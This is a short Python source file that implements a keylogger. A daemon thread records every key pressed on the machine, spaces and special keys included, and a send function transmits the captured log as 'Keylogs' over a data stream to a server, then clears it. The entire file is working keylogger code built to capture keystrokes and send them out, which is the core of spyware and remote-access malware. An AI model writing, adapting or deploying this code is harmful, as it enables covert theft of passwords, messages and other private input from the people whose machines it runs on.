import keyboard
import threading
import time

key_log = []

def log_keystrokes():
    """
    Listen to pressed keys and append them to a list.
    """
    while True:
        event = keyboard.read_event()
        if event.event_type == "down":  # Capture only when key pressed
            key = event.name
            if key == "space":
                key_log.append(" ")
            elif len(key) == 1:  # regular char
                key_log.append(key)
            else:  # special keys
                key_log.append(f" [{key}] ")

def send_keylogs(data_stream):
    """
    Send captured keys to the server.
    """
    if key_log:
        logs = "".join(key_log)
        data_stream.send(str.encode(f"Keylogs:\n{logs}\n"))
        key_log.clear()  # Clear the log after sending
    else:
        data_stream.send(str.encode("No keys pressed.\n"))

def start_keylogger(data_stream):
    """
    Initialize the keylogger in a separate thread.
    """
    # Launch key capture in a separate thread
    keylogger_thread = threading.Thread(target=log_keystrokes, daemon=True)
    keylogger_thread.start()
    
